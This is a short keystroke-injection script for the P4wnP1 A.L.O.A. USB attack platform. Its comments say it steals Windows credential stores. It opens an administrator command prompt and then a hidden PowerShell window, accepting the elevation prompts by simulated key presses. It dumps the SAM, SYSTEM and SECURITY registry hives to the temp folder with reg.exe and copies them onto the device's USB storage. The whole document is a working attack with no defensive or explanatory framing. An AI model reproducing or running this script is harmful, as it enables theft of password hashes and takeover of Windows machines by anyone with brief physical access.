// stealing sam, system and security file with P4wnP1 A.L.O.A

layout('us') // layout fr
press("GUI r") // win r
delay(200)
type("cmd") // cmd
press("CTRL SHIFT ENTER") // need admin right
delay(750)
press("LEFT")
delay(200)
press("ENTER")
delay(750)
type("reg.exe save hklm\\sam C:\\Windows\\Temp\\sam.save\n") // save sam file to /windows/temp directory
delay(750)
type("reg.exe save hklm\\system C:\\Windows\\Temp\\system.save\n") // save system 
delay(750)
type("reg.exe save hklm\\security C:\\Windows\\Temp\\security.save\n") // save security file
delay(750)
type("exit\n") // exit
delay(200)
press("GUI r") // win r 
delay(200)
type("powershell.exe") // type powershell
press("CTRL SHIFT ENTER") // admin right
delay(750)
press("LEFT")
press("ENTER")
delay(1000)
type("PowerShell.exe -windowstyle hidden { \n") // hide windows powershell
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'disk' } | select name\n") // set variable to get UMS name
type("cp C:\\Windows\\temp\\sam.save $usbPath.name\n")  // copy sam file to the ums of P4wnP1
delay(400)
type("cp C:\\Windows\\temp\\security.save $usbPath.name\n") // copy security file to the ums of P4wnP1
delay(400)
type("cp C:\\Windows\\temp\\system.save $usbPath.name\n") // copy system file to the ums of P4wnP1
delay(200)
type("}\n")
delay(1000)
type("exit\n") // exit

